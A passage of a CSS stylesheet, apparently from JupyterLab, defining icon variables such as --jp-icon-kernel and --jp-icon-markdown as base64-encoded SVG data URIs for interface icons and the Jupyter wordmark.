A2ODI5IDE1MS45MjExNTgsMCBDMTM3LjA4Nzg2OCwxNy42NTM0NjM0IDEwOC41ODI1ODksMjkuNTgwNDU2MSA3NS45NDIyODQyLDI5LjU4MDQ1NjEgTDc1Ljk0MjI4NDIsMjkuNTgwNDU2MSBaIiAvPgogICAgPHBhdGggdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMzczNjgsIDAuNzA0ODc4KSIgZD0iTTc1Ljk3ODQ1NzksMjQuNjI2NDA3MyBDMTA4LjYxODc2MywyNC42MjY0MDczIDEzNy4xMjQ0NTgsMzYuNTUzNDQxNSAxNTEuOTIxMTU4LDU0LjIwNjc4MDUgQzE0Ni40MTAyODQsMzguMzY2MjIyIDEzNi4xMzk0NTMsMjQuNjQwMTMxNyAxMjIuNTMwNjYzLDE0LjkyODQ4NzggQzEwOC45MjE0NTgsNS4yMTY4NDM5IDkyLjY0NzQ1NzksMCA3NS45NjA1Nzg5LDAgQzU5LjI3MzcsMCA0Mi45OTk3LDUuMjE2ODQzOSAyOS4zOTA0OTQ3LDE0LjkyODQ4NzggQzE1Ljc4MTUzODksMjQuNjQwMTMxNyA1LjUxMDgzMjExLDM4LjM2NjIyMiAwLDU0LjIwNjc4MDUgQzE0LjgzMzA4MTYsMzYuNTg5OTI5MyA0My4zMzg1Njg0LDI0LjYyNjQwNzMgNzUuOTc4NDU3OSwyNC42MjY0MDczIEw3NS45Nzg0NTc5LDI0LjYyNjQwNzMgWiIgLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-jupyter: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzkiIGhlaWdodD0iNTEiIHZpZXdCb3g9IjAgMCAzOSA1MSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTYzOCAtMjI4MSkiPgogICAgIDxnIGNsYXNzPSJqcC1qdXB5dGVyLWljb24tY29sb3IiIGZpbGw9IiNGMzc3MjYiPgogICAgICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNjM5Ljc0IDIzMTEuOTgpIiBkPSJNIDE4LjI2NDYgNy4xMzQxMUMgMTAuNDE0NSA3LjEzNDExIDMuNTU4NzIgNC4yNTc2IDAgMEMgMS4zMjUzOSAzLjgyMDQgMy43OTU1NiA3LjEzMDgxIDcuMDY4NiA5LjQ3MzAzQyAxMC4zNDE3IDExLjgxNTIgMTQuMjU1NyAxMy4wNzM0IDE4LjI2OSAxMy4wNzM0QyAyMi4yODIzIDEzLjA3MzQgMjYuMTk2MyAxMS44MTUyIDI5LjQ2OTQgOS40NzMwM0MgMzIuNzQyNCA3LjEzMDgxIDM1LjIxMjYgMy44MjA0IDM2LjUzOCAwQyAzMi45NzA1IDQuMjU3NiAyNi4xMTQ4IDcuMTM0MTEgMTguMjY0NiA3LjEzNDExWiIvPgogICAgICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNjM5LjczIDIyODUuNDgpIiBkPSJNIDE4LjI3MzMgNS45MzkzMUMgMjYuMTIzNSA1LjkzOTMxIDMyLjk3OTMgOC44MTU4MyAzNi41MzggMTMuMDczNEMgMzUuMjEyNiA5LjI1MzAzIDMyLjc0MjQgNS45NDI2MiAyOS40Njk0IDMuNjAwNEMgMjYuMTk2MyAxLjI1ODE4IDIyLjI4MjMgMCAxOC4yNjkgMEMgMTQuMjU1NyAwIDEwLjM0MTcgMS4yNTgxOCA3LjA2ODYgMy42MDA0QyAzLjc5NTU2IDUuOTQyNjIgMS4zMjUzOSA5LjI1MzAzIDAgMTMuMDczNEMgMy41Njc0NSA4LjgyNDYzIDEwLjQyMzIgNS45MzkzMSAxOC4yNzMzIDUuOTM5MzFaIi8+CiAgICA8L2c+CiAgICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNjY5LjMgMjI4MS4zMSkiIGQ9Ik0gNS44OTM1MyAyLjg0NEMgNS45MTg4OSAzLjQzMTY1IDUuNzcwODUgNC4wMTM2NyA1LjQ2ODE1IDQuNTE2NDVDIDUuMTY1NDUgNS4wMTkyMiA0LjcyMTY4IDUuNDIwMTUgNC4xOTI5OSA1LjY2ODUxQyAzLjY2NDMgNS45MTY4OCAzLjA3NDQ0IDYuMDAxNTEgMi40OTgwNSA1LjkxMTcxQyAxLjkyMTY2IDUuODIxOSAxLjM4NDYzIDUuNTYxNyAwLjk1NDg5OCA1LjE2NDAxQyAwLjUyNTE3IDQuNzY2MzMgMC4yMjIwNTYgNC4yNDkwMyAwLjA4MzkwMzcgMy42Nzc1N0MgLTAuMDU0MjQ4MyAzLjEwNjExIC0wLjAyMTIzIDIuNTA2MTcgMC4xNzg3ODEgMS45NTM2NEMgMC4zNzg3OTMgMS40MDExIDAuNzM2ODA5IDAuOTIwODE3IDEuMjA3NTQgMC41NzM1MzhDIDEuNjc4MjYgMC4yMjYyNTkgMi4yNDA1NSAwLjAyNzU5MTkgMi44MjMyNiAwLjAwMjY3MjI5QyAzLjYwMzg5IC0wLjAzMDcxMTUgNC4zNjU3MyAwLjI0OTc4OSA0Ljk0MTQyIDAuNzgyNTUxQyA1LjUxNzExIDEuMzE1MzEgNS44NTk1NiAyLjA1Njc2IDUuODkzNTMgMi44NDRaIi8+CiAgICAgIDxwYXRoIHRyYW5zZm9ybT0idHJhbnNsYXRlKDE2MzkuOCAyMzIzLjgxKSIgZD0iTSA3LjQyNzg5IDMuNTgzMzhDIDcuNDYwMDggNC4zMjQzIDcuMjczNTUgNS4wNTgxOSA2Ljg5MTkzIDUuNjkyMTNDIDYuNTEwMzEgNi4zMjYwNyA1Ljk1MDc1IDYuODMxNTYgNS4yODQxMSA3LjE0NDZDIDQuNjE3NDcgNy40NTc2MyAzLjg3MzcxIDcuNTY0MTQgMy4xNDcwMiA3LjQ1MDYzQyAyLjQyMDMyIDcuMzM3MTIgMS43NDMzNiA3LjAwODcgMS4yMDE4NCA2LjUwNjk1QyAwLjY2MDMyOCA2LjAwNTIgMC4yNzg2MSA1LjM1MjY4IDAuMTA1MDE3IDQuNjMyMDJDIC0wLjA2ODU3NTcgMy45MTEzNSAtMC4wMjYyMzYxIDMuMTU0OTQgMC4yMjY2NzUgMi40NTg1NkMgMC40Nzk1ODcgMS43NjIxNyAwLjkzMTY5NyAxLjE1NzEzIDEuNTI1NzYgMC43MjAwMzNDIDIuMTE5ODMgMC4yODI5MzUgMi44MjkxNCAwLjAzMzQzOTUgMy41NjM4OSAwLjAwMzEzMzQ0QyA0LjU0NjY3IC0wLjAzNzQwMzMgNS41MDUyOSAwLjMxNjcwNiA2LjIyOTYxIDAuOTg3ODM1QyA2Ljk1MzkzIDEuNjU4OTYgNy4zODQ4NCAyLjU5MjM1IDcuNDI3ODkgMy41ODMzOEwgNy40Mjc4OSAzLjU4MzM4WiIvPgogICAgICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNjM4LjM2IDIyODYuMDYpIiBkPSJNIDIuMjc0NzEgNC4zOTYyOUMgMS44NDM2MyA0LjQxNTA4IDEuNDE2NzEgNC4zMDQ0NSAxLjA0Nzk5IDQuMDc4NDNDIDAuNjc5MjY4IDMuODUyNCAwLjM4NTMyOCAzLjUyMTE0IDAuMjAzMzcxIDMuMTI2NTZDIDAuMDIxNDEzNiAyLjczMTk4IC0wLjA0MDM3OTggMi4yOTE4MyAwLjAyNTgxMTYgMS44NjE4MUMgMC4wOTIwMDMxIDEuNDMxOCAwLjI4MzIwNCAxLjAzMTI2IDAuNTc1MjEzIDAuNzEwODgzQyAwLjg2NzIyMiAwLjM5MDUxIDEuMjQ2OTEgMC4xNjQ3MDggMS42NjYyMiAwLjA2MjA1OTJDIDIuMDg1NTMgLTAuMDQwNTg5NyAyLjUyNTYxIC0wLjAxNTQ3MTQgMi45MzA3NiAwLjEzNDIzNUMgMy4zMzU5MSAwLjI4Mzk0MSAzLjY4NzkyIDAuNTUxNTA1IDMuOTQyMjIgMC45MDMwNkMgNC4xOTY1MiAxLjI1NDYyIDQuMzQxNjkgMS42NzQzNiA0LjM1OTM1IDIuMTA5MTZDIDQuMzgyOTkgMi42OTEwNyA0LjE3Njc4IDMuMjU4NjkgMy43ODU5NyAzLjY4NzQ2QyAzLjM5NTE2IDQuMTE2MjQgMi44NTE2NiA0LjM3MTE2IDIuMjc0NzEgNC4zOTYyOUwgMi4yNzQ3MSA0LjM5NjI5WiIvPgogICAgPC9nPgogIDwvZz4+Cjwvc3ZnPgo=);
  --jp-icon-jupyterlab-wordmark: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIHZpZXdCb3g9IjAgMCAxODYwLjggNDc1Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjIiIGZpbGw9IiM0RTRFNEUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDQ4MC4xMzY0MDEsIDY0LjI3MTQ5MykiPgogICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDU4Ljg3NTU2NikiPgogICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjA4NzYwMywgMC4xNDAyOTQpIj4KICAgICAgICA8cGF0aCBkPSJNLTQyNi45LDE2OS44YzAsNDguNy0zLjcsNjQuNy0xMy42LDc2LjRjLTEwLjgsMTAtMjUsMTUuNS0zOS43LDE1LjVsMy43LDI5IGMyMi44LDAuMyw0NC44LTcuOSw2MS45LTIzLjFjMTcuOC0xOC41LDI0LTQ0LjEsMjQtODMuM1YwSC00Mjd2MTcwLjFMLTQyNi45LDE2OS44TC00MjYuOSwxNjkuOHoiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTU1LjA0NTI5NiwgNTYuODM3MTA0KSI+CiAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEuNTYyNDUzLCAxLjc5OTg0MikiPgogICAgICAgIDxwYXRoIGQ9Ik0tMzEyLDE0OGMwLDIxLDAsMzkuNSwxLjcsNTUuNGgtMzEuOGwtMi4xLTMzLjNoLTAuOGMtNi43LDExLjYtMTYuNCwyMS4zLTI4LDI3LjkgYy0xMS42LDYuNi0yNC44LDEwLTM4LjIsOS44Yy0zMS40LDAtNjktMTcuNy02OS04OVYwaDM2LjR2MTEyLjdjMCwzOC43LDExLjYsNjQuNyw0NC42LDY0LjdjMTAuMy0wLjIsMjAuNC0zLjUsMjguOS05LjQgYzguNS01LjksMTUuMS0xNC4zLDE4LjktMjMuOWMyLjItNi4xLDMuMy0xMi41LDMuMy0xOC45VjAuMmgzNi40VjE0OEgtMzEyTC0zMTIsMTQ4eiIvPgogICAgICA8L2c+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgzOTAuMDEzMzIyLCA1My40Nzk2MzgpIj4KICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMS43MDY0NTgsIDAuMjMxNDI1KSI+CiAgICAgICAgPHBhdGggZD0iTS00NzguNiw3MS40YzAtMjYtMC44LTQ3LTEuNy02Ni43aDMyLjdsMS43LDM0LjhoMC44YzcuMS0xMi41LDE3LjUtMjIuOCwzMC4xLTI5LjcgYzEyLjUtNywyNi43LTEwLjMsNDEtOS44YzQ4LjMsMCw4NC43LDQxLjcsODQuNywxMDMuM2MwLDczLjEtNDMuNywxMDkuMi05MSwxMDkuMmMtMTIuMSwwLjUtMjQuMi0yLjItMzUtNy44IGMtMTAuOC01LjYtMTkuOS0xMy45LTI2LjYtMjQuMmgtMC44VjI5MWgtMzZ2LTIyMEwtNDc4LjYsNzEuNEwtNDc4LjYsNzEuNHogTS00NDIuNiwxMjUuNmMwLjEsNS4xLDAuNiwxMC4xLDEuNywxNS4xIGMzLDEyLjMsOS45LDIzLjMsMTkuOCwzMS4xYzkuOSw3LjgsMjIuMSwxMi4xLDM0LjcsMTIuMWMzOC41LDAsNjAuNy0zMS45LDYwLjctNzguNWMwLTQwLjctMjEuMS03NS42LTU5LjUtNzUuNiBjLTEyLjksMC40LTI1LjMsNS4xLTM1LjMsMTMuNGMtOS45LDguMy0xNi45LDE5LjctMTkuNiwzMi40Yy0xLjUsNC45LTIuMywxMC0yLjUsMTUuMVYxMjUuNkwtNDQyLjYsMTI1LjZMLTQ0Mi42LDEyNS42eiIvPgogICAgICA8L2c+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg2MDYuNzQwNzI2LCA1Ni44MzcxMDQpIj4KICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC43NTEyMjYsIDEuOTg5Mjk5KSI+CiAgICAgICAgPHBhdGggZD0iTS00NDAuOCwwbDQzLjcsMTIwLjFjNC41LDEzLjQsOS41LDI5LjQsMTIuOCw0MS43aDAuOGMzLjctMTIuMiw3LjktMjcuNywxMi44LTQyLjQgbDM5LjctMTE5LjJoMzguNUwtMzQ2LjksMTQ1Yy0yNiw2OS43LTQzLjcsMTA1LjQtNjguNiwxMjcuMmMtMTIuNSwxMS43LTI3LjksMjAtNDQuNiwyMy45bC05LjEtMzEuMSBjMTEuNy0zLjksMjIuNS0xMC4xLDMxLjgtMTguMWMxMy4yLTExLjEsMjMuNy0yNS4yLDMwLjYtNDEuMmMxLjUtMi44LDIuNS01LjcsMi45LTguOGMtMC4zLTMuMy0xLjItNi42LTIuNS05LjdMLTQ4MC4yLDAuMSBoMzkuN0wtNDQwLjgsMEwtNDQwLjgsMHoiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoODIyLjc0ODEwNCwgMC4wMDAwMDApIj4KICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMS40NjQwNTAsIDAuMzc4OTE0KSI+CiAgICAgICAgPHBhdGggZD0iTS00MTMuNywwdjU4LjNoNTJ2MjguMmgtNTJWMTk2YzAsMjUsNywzOS41LDI3LjMsMzkuNWM3LjEsMC4xLDE0LjItMC43LDIxLjEtMi41IGwxLjcsMjcuN2MtMTAuMywzLjctMjEuMyw1LjQtMzIuMiw1Yy03LjMsMC40LTE0LjYtMC43LTIxLjMtMy40Yy02LjgtMi43LTEyLjktNi44LTE3LjktMTIuMWMtMTAuMy0xMC45LTE0LjEtMjktMTQuMS01Mi45IFY4Ni41aC0zMVY1OC4zaDMxVjkuNkwtNDEzLjcsMEwtNDEzLjcsMHoiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoOTc0LjQzMzI4NiwgNTMuNDc5NjM4KSI+CiAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAuOTkwMDM0LCAwLjYxMDMzOSkiPgogICAgICAgIDxwYXRoIGQ9Ik0tNDQ1LjgsMTEzYzAuOCw1MCwzMi4yLDcwLjYsNjguNiw3MC42YzE5LDAuNiwzNy45LTMsNTUuMy0xMC41bDYuMiwyNi40IGMtMjAuOSw4LjktNDMuNSwxMy4xLTY2LjIsMTIuNmMtNjEuNSwwLTk4LjMtNDEuMi05OC4zLTEwMi41Qy00ODAuMiw0OC4yLTQ0NC43LDAtMzg2LjUsMGM2NS4yLDAsODIuNyw1OC4zLDgyLjcsOTUuNyBjLTAuMSw1LjgtMC41LDExLjUtMS4yLDE3LjJoLTE0MC42SC00NDUuOEwtNDQ1LjgsMTEzeiBNLTMzOS4yLDg2LjZjMC40LTIzLjUtOS41LTYwLjEtNTAuNC02MC4xIGMtMzYuOCwwLTUyLjgsMzQuNC01NS43LDYwLjFILTMzOS4yTC0zMzkuMiw4Ni42TC0zMzkuMiw4Ni42eiIvPgogICAgICA8L2c+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjAxLjk2MTA1OCwgNTMuNDc5NjM4KSI+CiAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEuMTc5NjQwLCAwLjcwNTA2OCkiPgogICAgICAgIDxwYXRoIGQ9Ik0tNDc4LjYsNjhjMC0yMy45LTAuNC00NC41LTEuNy02My40aDMxLjhsMS4yLDM5LjloMS43YzkuMS0yNy4zLDMxLTQ0LjUsNTUuMy00NC41IGMzLjUtMC4xLDcsMC40LDEwLjMsMS4ydjM0LjhjLTQuMS0wLjktOC4yLTEuMy0xMi40LTEuMmMtMjUuNiwwLTQzLjcsMTkuNy00OC43LDQ3LjRjLTEsNS43LTEuNiwxMS41LTEuNywxNy4ydjEwOC4zaC0zNlY2OCBMLTQ3OC42LDY4eiIvPgogICAgICA8L2c+CiAgICA8L2c+CiAgPC9nPgoKICA8ZyBjbGFzcz0ianAtaWNvbi13YXJuMCIgZmlsbD0iI0YzNzcyNiI+CiAgICA8cGF0aCBkPSJNMTM1Mi4zLDMyNi4yaDM3VjI4aC0zN1YzMjYuMnogTTE2MDQuOCwzMjYuMmMtMi41LTEzLjktMy40LTMxLjEtMy40LTQ4Ljd2LTc2IGMwLTQwLjctMTUuMS04My4xLTc3LjMtODMuMWMtMjUuNiwwLTUwLDcuMS02Ni44LDE4LjFsOC40LDI0LjRjMTQuMy05LjIsMzQtMTUuMSw1My0xNS4xYzQxLjYsMCw0Ni4yLDMwLjIsNDYuMiw0N3Y0LjIgYy03OC42LTAuNC0xMjIuMywyNi41LTEyMi4zLDc1LjZjMCwyOS40LDIxLDU4LjQsNjIuMiw1OC40YzI5LDAsNTAuOS0xNC4zLDYyLjItMzAuMmgxLjNsMi45LDI1LjZIMTYwNC44eiBNMTU2NS43LDI1Ny43IGMwLDMuOC0wLjgsOC0yLjEsMTEuOGMtNS45LDE3LjItMjIuNywzNC00OS4yLDM0Yy0xOC45LDAtMzQuOS0xMS4zLTM0LjktMzUuM2MwLTM5LjUsNDUuOC00Ni42LDg2LjItNDUuOFYyNTcuN3ogTTE2OTguNSwzMjYuMiBsMS43LTMzLjZoMS4zYzE1LjEsMjYuOSwzOC43LDM4LjIsNjguMSwzOC4yYzQ1LjQsMCw5MS4yLTM2LjEsOTEuMi0xMDguOGMwLjQtNjEuNy0zNS4zLTEwMy43LTg1LjctMTAzLjcgYy0zMi44LDAtNTYuMywxNC43LTY5LjMsMzcuNGgtMC44VjI4aC0zNi42djI0NS43YzAsMTguMS0wLjgsMzguNi0xLjcsNTIuNUgxNjk4LjV6IE0xNzA0LjgsMjA4LjJjMC01LjksMS4zLTEwLjksMi4xLTE1LjEgYzcuNi0yOC4xLDMxLjEtNDUuNCw1Ni4zLTQ1LjRjMzkuNSwwLDYwLjUsMzQuOSw2MC41LDc1LjZjMCw0Ni42LTIzLjEsNzguMS02MS44LDc4LjFjLTI2LjksMC00OC4zLTE3LjYtNTUuNS00My4zIGMtMC44LTQuMi0xLjctOC44LTEuNy0xMy40VjIwOC4yeiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-kernel: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxwYXRoIGNsYXNzPSJqcC1pY29uMiIgZmlsbD0iIzYxNjE2MSIgZD0iTTE1IDlIOXY2aDZWOXptLTIgNGgtMnYtMmgydjJ6bTgtMlY5aC0yVjdjMC0xLjEtLjktMi0yLTJoLTJWM2gtMnYyaC0yVjNIOXYySDdjLTEuMSAwLTIgLjktMiAydjJIM3YyaDJ2MkgzdjJoMnYyYzAgMS4xLjkgMiAyIDJoMnYyaDJ2LTJoMnYyaDJ2LTJoMmMxLjEgMCAyLS45IDItMnYtMmgydi0yaC0ydi0yaDJ6bS00IDZIN1Y3aDEwdjEweiIvPgo8L3N2Zz4K);
  --jp-icon-keyboard: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBkPSJNMjAgNUg0Yy0xLjEgMC0xLjk5LjktMS45OSAyTDIgMTdjMCAxLjEuOSAyIDIgMmgxNmMxLjEgMCAyLS45IDItMlY3YzAtMS4xLS45LTItMi0yem0tOSAzaDJ2MmgtMlY4em0wIDNoMnYyaC0ydi0yek04IDhoMnYySDhWOHptMCAzaDJ2Mkg4di0yem0tMSAySDV2LTJoMnYyem0wLTNINVY4aDJ2MnptOSA3SDh2LTJoOHYyem0wLTRoLTJ2LTJoMnYyem0wLTNoLTJWOGgydjJ6bTMgM2gtMnYtMmgydjJ6bTAtM2gtMlY4aDJ2MnoiLz4KPC9zdmc+Cg==);
  --jp-icon-launch: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzIgMzIiIHdpZHRoPSIzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIj4KICAgIDxwYXRoIGQ9Ik0yNiwyOEg2YTIuMDAyNywyLjAwMjcsMCwwLDEtMi0yVjZBMi4wMDI3LDIuMDAyNywwLDAsMSw2LDRIMTZWNkg2VjI2SDI2VjE2aDJWMjZBMi4wMDI3LDIuMDAyNywwLDAsMSwyNiwyOFoiLz4KICAgIDxwb2x5Z29uIHBvaW50cz0iMjAgMiAyMCA0IDI2LjU4NiA0IDE4IDEyLjU4NiAxOS40MTQgMTQgMjggNS40MTQgMjggMTIgMzAgMTIgMzAgMiAyMCAyIi8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-launcher: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBkPSJNMTkgMTlINVY1aDdWM0g1YTIgMiAwIDAwLTIgMnYxNGEyIDIgMCAwMDIgMmgxNGMxLjEgMCAyLS45IDItMnYtN2gtMnY3ek0xNCAzdjJoMy41OWwtOS44MyA5LjgzIDEuNDEgMS40MUwxOSA2LjQxVjEwaDJWM2gtN3oiLz4KPC9zdmc+Cg==);
  --jp-icon-line-form: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxwYXRoIGZpbGw9IndoaXRlIiBkPSJNNS44OCA0LjEyTDEzLjc2IDEybC03Ljg4IDcuODhMOCAyMmwxMC0xMEw4IDJ6Ii8+Cjwvc3ZnPgo=);
  --jp-icon-link: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTMuOSAxMmMwLTEuNzEgMS4zOS0zLjEgMy4xLTMuMWg0VjdIN2MtMi43NiAwLTUgMi4yNC01IDVzMi4yNCA1IDUgNWg0di0xLjlIN2MtMS43MSAwLTMuMS0xLjM5LTMuMS0zLjF6TTggMTNoOHYtMkg4djJ6bTktNmgtNHYxLjloNGMxLjcxIDAgMy4xIDEuMzkgMy4xIDMuMXMtMS4zOSAzLjEtMy4xIDMuMWgtNFYxN2g0YzIuNzYgMCA1LTIuMjQgNS01cy0yLjI0LTUtNS01eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-list: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxwYXRoIGNsYXNzPSJqcC1pY29uMiBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiM2MTYxNjEiIGQ9Ik0xOSA1djE0SDVWNWgxNG0xLjEtMkgzLjljLS41IDAtLjkuNC0uOS45djE2LjJjMCAuNC40LjkuOS45aDE2LjJjLjQgMCAuOS0uNS45LS45VjMuOWMwLS41LS41LS45LS45LS45ek0xMSA3aDZ2MmgtNlY3em0wIDRoNnYyaC02di0yem0wIDRoNnYyaC02ek03IDdoMnYySDd6bTAgNGgydjJIN3ptMCA0aDJ2Mkg3eiIvPgo8L3N2Zz4K);
  --jp-icon-markdown: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8cGF0aCBjbGFzcz0ianAtaWNvbi1jb250cmFzdDAganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjN0IxRkEyIiBkPSJNNSAxNC45aDEybC02LjEgNnptOS40LTYuOGMwLTEuMy0uMS0yLjktLjEtNC41LS40IDEuNC0uOSAyLjktMS4zIDQuM2wtMS4zIDQuM2gtMkw4LjUgNy45Yy0uNC0xLjMtLjctMi45LTEtNC4zLS4xIDEuNi0uMSAzLjItLjIgNC42TDcgMTIuNEg0LjhsLjctMTFoMy4zTDEwIDVjLjQgMS4yLjcgMi43IDEgMy45LjMtMS4yLjctMi42IDEtMy45bDEuMi0zLjdoMy4zbC42IDExaC0yLjRsLS4zLTQuMnoiLz4KPC9zdmc+Cg==);
  --jp-icon-move-down: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHZpZXdCb3g9IjAgMCAxNCAxNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggY2xhc3M9ImpwLWljb24zIiBkPSJNMTIuNDcxIDcuNTI4OTlDMTIuNzYzMiA3LjIzNjg0IDEyLjc2MzIgNi43NjMxNiAxMi40NzEgNi40NzEwMVY2LjQ3MTAxQzEyLjE3OSA2LjE3OTA1IDExLjcwNTcgNi4xNzg4NCAxMS40MTM1IDYuNDcwNTRMNy43NSAxMC4xMjc1VjEuNzVDNy43NSAxLjMzNTc5IDcuNDE0MjEgMSA3IDFWMUM2LjU4NTc5IDEgNi4yNSAxLjMzNTc5IDYuMjUgMS43NVYxMC4xMjc1TDIuNTk3MjYgNi40NjgyMkMyLjMwMzM4IDYuMTczODEgMS44MjY0MSA2LjE3MzU5IDEuNTMyMjYgNi40Njc3NFY2LjQ2Nzc0QzEuMjM4MyA2Ljc2MTcgMS4yMzgzIDcuMjM4MyAxLjUzMjI2IDcuNTMyMjZMNi4yOTI4OSAxMi4yOTI5QzYuNjgzNDIgMTIuNjgzNCA3LjMxNjU4IDEyLjY4MzQgNy43MDcxMSAxMi4yOTI5TDEyLjQ3MSA3LjUyODk5WiIgZmlsbD0iIzYxNjE2MSIvPgo8L3N2Zz4K);
  --jp-icon-move-up: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHZpZXdCb3g9IjAgMCAxNCAxNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggY2xhc3M9ImpwLWljb24zIiBkPSJNMS41Mjg5OSA2LjQ3MTAxQzEuMjM2ODQgNi43NjMxNiAxLjIzNjg0IDcuMjM2ODQgMS41Mjg5OSA3LjUyODk5VjcuNTI4OTlDMS44MjA5NSA3LjgyMDk1IDIuMjk0MjYgNy44MjExNiAyLjU4NjQ5IDcuNTI5NDZMNi4yNSAzLjg3MjVWMTIuMjVDNi4yNSAxMi42NjQyIDYuNTg1NzkgMTMgNyAxM1YxM0M3LjQxNDIxIDEzIDcuNzUgMTIuNjY0MiA3Ljc1IDEyLjI1VjMuODcyNUwxMS40MDI3IDcuNTMxNzhDMTEuNjk2NiA3LjgyNjE5IDEyLjE3MzYgNy44MjY0MSAxMi40Njc3IDcuNTMyMjZWNy41MzIyNkMxMi43NjE3IDcuMjM4MyAxMi43NjE3IDYuNzYxNyAxMi40Njc3IDYuNDY3NzRMNy43MDcxMSAxLjcwNzExQzcuMzE2NTggMS4zMTY1OCA2LjY4MzQyIDEuMzE2NTggNi4yOTI4OSAxLjcwNzExTDEuNTI4OTkgNi40NzEwMVoiIGZpbGw9IiM2MTYxNjEiLz4KPC9zdmc+Cg==);
